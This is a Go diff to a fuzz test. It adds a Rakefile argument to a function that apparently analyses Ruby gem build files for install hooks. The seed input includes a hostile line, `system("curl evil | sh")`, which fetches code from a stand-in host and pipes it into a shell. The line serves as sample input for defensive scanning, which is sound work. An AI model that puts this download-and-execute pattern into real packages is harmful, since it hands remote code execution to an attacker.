@@ -31,11 +31,11 @@ func FuzzAnalyzeRust(f *testing.F) {
 }
 
 func FuzzAnalyzeRuby(f *testing.F) {
-	f.Add(`require 'net/http'; system("curl evil | sh")`, `Gem::Specification.new`)
-	f.Add("", "")
+	f.Add(`require 'net/http'; system("curl evil | sh")`, `Gem::Specification.new`, `task :compile do; end`)
+	f.Add("", "", "")
 
-	f.Fuzz(func(t *testing.T, extconf, gemspec string) {
-		s := AnalyzeRuby(extconf, gemspec)
+	f.Fuzz(func(t *testing.T, extconf, gemspec, rakefile string) {
+		s := AnalyzeRuby(extconf, gemspec, rakefile)
 		_ = s.Hooks
 	})
 }
